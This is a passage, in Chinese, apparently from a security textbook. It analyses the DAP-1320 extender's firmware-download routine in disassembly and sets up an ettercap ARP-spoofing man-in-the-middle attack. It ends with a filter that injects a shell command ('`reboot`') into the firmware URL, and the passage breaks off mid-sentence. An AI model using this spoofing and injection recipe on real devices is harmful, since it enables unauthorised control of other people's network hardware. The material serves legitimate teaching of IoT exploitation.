
反汇编。向下滚动，我们看到该字符串正在被用于 sprintf 构造下载命令，并传递给位于 00409064 的 system，如下所示。

```
LOAD:00409010 la $a1, aWgetPTmpSDevNu # "wget -P /tmp/ %s > /dev/null"
LOAD:00409014 jalr $t9 ; sprintf
LOAD:00409018 move $a0, $s2
LOAD:0040901C lw $gp, 0x2B0+var_2A0($sp)
LOAD:00409020 move $a0, $s0
LOAD:00409024 move $a1, $zero
LOAD:00409028 la $t9, memset
LOAD:0040902C nop
LOAD:00409030 jalr $t9 ; memset
LOAD:00409034 li $a2, 0x80
LOAD:00409038 lw $gp, 0x2B0+var_2A0($sp)
LOAD:0040903C lw $a2, 8($s3)
LOAD:00409040 lui $a1, 0x43
LOAD:00409044 la $t9, sprintf
LOAD:00409048 la $a1, aTmpS # "/tmp/%s"
LOAD:0040904C jalr $t9 ; sprintf
LOAD:00409050 move $a0, $s0
LOAD:00409054 lw $gp, 0x2B0+var_2A0($sp)
LOAD:00409058 nop
LOAD:0040905C la $t9, system
LOAD:00409060 nop
LOAD:00409064 jalr $t9 ; system
```

在这一点上，我们至少知道该字符串正在用于调用 system。从这里开始，我们需要了解格式字符串中的 URL 是如何提供的。这要求我们跟踪程序到此点的控制流。

要跟踪到达此子例程/函数入口的控制流，我们需要滚动到函数顶部并选择左侧的地址。选中地址后，只需按 X 键即可跳转到其交叉引用，如所示。

```
LOAD:00408F30 download_fw_and_lp:
LOAD:00408F30
LOAD:00408F30 var_2A0
LOAD:00408F30 var_298
LOAD:00408F30 var_218
LOAD:00408F30 var_118
LOAD:00408F30 var_14
LOAD:00408F30 var_10
LOAD:00408F30 var_C
LOAD:00408F30 var_8
LOAD:00408F30 var_4
LOAD:00408F30
LOAD:00408F30
LOAD:00408F34
```

![](img/5f597c6a70133069118d9e804ace3775_666_0.png)

```
lui $gp, 0x45
addiu $sp, -0x2B0
```

下载例程的交叉引用实际上是一个查找表，包含指向每个命令入口点的函数指针。代码会搜索命令并跳转到其相邻的例程指针。您将看到“IPv6 功能”、“将固件和语言下载到 DUT”以及“get_wlan_ip”的命令，如下所示。请注意，命令的形式为短名称、函数指针和长名称。由于这是一个查找表，我们需要找到表的开头才能定位其交叉引用。

```
LOAD:00446754                 .word aIpv6             # "ipv6"
LOAD:00446758                 .word sub_40E790
LOAD:0044675C                 .word aIpv6Function     # "IPv6 Function"
LOAD:00446760                 .word aDownloadFwLp     # "download_fw_lp"
LOAD:00446764                 .word download_fw_and_lp
LOAD:00446768                 .word aDownloadFwAndL   # "Download FW and language to DUT"
LOAD:0044676C                 .word aGetWlanIp        # "get_wlan_ip"
LOAD:00446770                 .word sub_40D680
LOAD:00446774                 .word aGetWlanIp_0      # "Get wlan ip"
```

尽管我们尚未完全将 system 调用的源头追溯到根源，但可以肯定的是，它指向用于下载固件的 cgi 命令。对“download_fw_lp”字符串进行几次 grep ① 就能找到其源头 ②③。至此，我们将继续尝试通过固件更新来利用该设备。

```
①root@kali:~/DAP-1320/fmk/rootfs# grep -r download_fw_lp .
②./www/Firmware.htm:<input type="hidden" id="action" name="action" value="download_fw_lp">
Binary file ./bin/ssi matches
①root@kali:~/DAP-1320/fmk/rootfs# grep -C 7 download_fw_lp www/Firmware.htm
<form id="form3" name="form3" method="POST" action="apply.cgi">
<input type="hidden" id="html_response_page" name="html_response_page" value="Firmware.htm">
<input type="hidden" name="html_response_return_page" value="Firmware.htm">
<input type="hidden" id="html_response_message" name="html_response_message" value="dl_fw_lp">
<input type="hidden" id="file_link" name="file_link" value="">
<input type="hidden" id="file_name" name="file_name" value="">
<input type="hidden" id="update_type" name="update_type" value="">
③<input type="hidden" id="action" name="action" value="download_fw_lp">
</form>
```

## 使用硬件进行动态分析

评估的静态分析部分已完成。从现在起，我们将查看系统运行时的情况。我们需要搭建一个环境来拦截设备到广域网（WAN）的请求，将 DAP-1320 连接到我们的测试网络，并开始执行固件更新流程。最终目标是通过命令注入在无线扩展器上执行某些操作。

### 测试环境搭建

我们选择的测试环境使用 64 位 Kali Linux 2017、Ettercap、固件版本为 1.11 的 DAP-1320 无线范围扩展器以及一个标准无线网络。其思路是对 DAP-1320 进行 ARP 欺骗，使得所有从设备发出或发往设备的流量均经过我们的 Kali Linux 系统。虽然我们本可以简单地在扩展器和路由器之间插入一个可在检查和修改后转发流量的设备，但 ARP 欺骗极有可能是实际场景中使用的攻击机制。

### Ettercap

简单复习一下，地址解析协议（ARP）是将 IP 地址解析为其媒体访问控制（MAC）地址的机制。MAC 地址是由网络设备制造商分配的唯一地址。简单来说，当一个站点需要与另一个站点通信时，它会使用 ARP 来确定与要使用的 IP 关联的 MAC 地址。ARP 欺骗实际上会中毒站点的 ARP 表，导致它们使用攻击者的 MAC 地址，而不是目标站点的实际 MAC 地址。因此，所有发往目标的流量都将经过攻击者的站点。这实际上相当于在无需物理修改网络的情况下插入一个设备。

Ettercap 是一款允许我们为中间人（MITM）攻击进行 ARP 欺骗、解析数据包、修改数据包并将其转发给接收者的工具。首先，我们使用 Ettercap 通过发出以下命令来查看设备与互联网之间的流量（此示例中设备为 192.168.1.173，网关为 192.168.1.1）：

```
root@kali:~/DAP-1320# ettercap -T -q -M arp:remote /192.168.1.173// /192.168.1.1//
```

Ettercap 启动后，我们将在与设备交互时使用 Wireshark 查看流量。启动 Wireshark 并开始捕获后，我们可以查看设备升级页面上的固件更新，如所示。

![](img/5f597c6a70133069118d9e804ace3775_669_0.png)

单击“检查新固件”按钮，然后在 Wireshark 中跟随 TCP 流。我们现在看到设备在前两行访问 http://wrpd.dlink.com.tw/router/firmware/query.asp?model=DAP-1320_Ax_Default，响应为 XML 编码的数据，如下所示。

![](img/5f597c6a70133069118d9e804ace3775_669_1.png)

访问我们捕获的 URL，可以看到 XML 中包含了固件版本的主版本号和次版本号、下载站点以及发行说明。

```
<DAP-1320_Ax>
<Default>
<FW_Version>
<Major>01</Major>
<Minor>11</Minor>
<Date>2013-09-17</Date>
<Recommend/>
</FW_Version>
<Download_Site>
<Global>
<Firmware>
http://d9qhdod87cnnk.cloudfront.net/DAP-1320/Ax/Default/0111/DAP1320A2_FW111B10.bin
</Firmware>
<Release_Note>
http://wrpd.dlink.com/router/firmware/GetReleaseNote.aspx?model=DAP-1320_Ax_Default_FW_0111
</Release_Note>
</Global>
</Download_Site>
</Default>
</DAP-1320_Ax>
```

掌握这些信息后，我们可以假设，如果将次版本号改为 12 并将固件链接改为 shell 命令，将强制设备尝试更新并因此运行我们的命令。为了完成此任务，我们需要创建一个 Ettercap 过滤器 ➊（之前已保存并在此显示），对其进行编译 ➋，然后运行它 ➌，具体如下：

```
root@kali:~/DAP-1320# cat ettercap.filter
if (ip.proto == TCP && tcp.src == 80) {
msg("Processing Minor Response...\\n");
if (search(DATA.data, "Minor>11")) {
replace("<Minor>11", "<Minor>12");
msg("zapped Minor version!\\n");
}
}

if (ip.proto == TCP && tcp.src == 80) {
msg("Processing Firmware Response...\\n");
if (search(DATA.data, "http://d")) {
replace("http://d", "`reboot`");
msg("zapped firmware!\\n");
}
}
}
```

```
root@kali:~/DAP-1320# etterfilter ettercap-reboot.filter -o ettercap-reboot.ef
<output omitted for brevity>
root@kali:~/DAP-1320# ettercap -T -q -F ettercap-reboot.ef -M arp:remote
/192.168.1.173// /192.168.1.1//
<output omitted for brevity>
```

为了确定我们的命令是否正在执行，我们需要在发起升级时 ping 该设备并监控 ping 消息。但首先，请注意，单击后
